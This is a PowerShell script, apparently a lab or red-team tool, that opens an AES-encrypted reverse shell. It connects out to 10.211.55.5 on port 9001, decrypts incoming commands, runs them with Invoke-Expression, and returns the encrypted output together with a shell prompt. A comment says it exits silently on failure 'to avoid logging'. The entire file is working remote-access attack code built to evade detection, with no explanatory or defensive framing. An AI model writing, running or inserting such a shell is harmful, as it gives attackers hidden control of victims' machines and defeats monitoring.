# Configuration
$u = "10.211.55.5"
$p = 9001

# Use a 32-byte key for AES-256
$key = [System.Text.Encoding]::UTF8.GetBytes("0123456789ABCDEF0123456789ABCDEF") 
$iv  = [System.Text.Encoding]::UTF8.GetBytes("1234567890ABCDEF")

function Invoke-Decrypt {
    param([byte[]]$data)
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $key
    $aes.IV = $iv
    $decryptor = $aes.CreateDecryptor()
    $ms = New-Object System.IO.MemoryStream(,$data)
    $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Read)
    $sr = New-Object System.IO.StreamReader($cs)
    return $sr.ReadToEnd()
}

function Invoke-Encrypt {
    param([string]$data)
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $key
    $aes.IV = $iv
    $encryptor = $aes.CreateEncryptor()
    $ms = New-Object System.IO.MemoryStream
    $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
    $sw = New-Object System.IO.StreamWriter($cs)
    $sw.Write($data)
    $sw.Flush()
    $cs.FlushFinalBlock()
    return $ms.ToArray()
}

try {
    $client = New-Object System.Net.Sockets.TcpClient($u, $p)
    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $buffer = New-Object byte[] 4096

    while ($client.Connected) {
        $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
        if ($bytesRead -eq 0) { break }

        $encryptedInput = $buffer[0..($bytesRead-1)]
        $command = Invoke-Decrypt $encryptedInput
        
        $output = try {
            Invoke-Expression $command | Out-String
        } catch {
            $_.Exception.Message
        }
        
        $responseBytes = Invoke-Encrypt ($output + "PS " + (Get-Location).Path + "> ")
        $stream.Write($responseBytes, 0, $responseBytes.Length)
        $stream.Flush()
    }
} catch {
    # Silently exit on failure to avoid logging
} finally {
    if ($client) { $client.Close() }
}
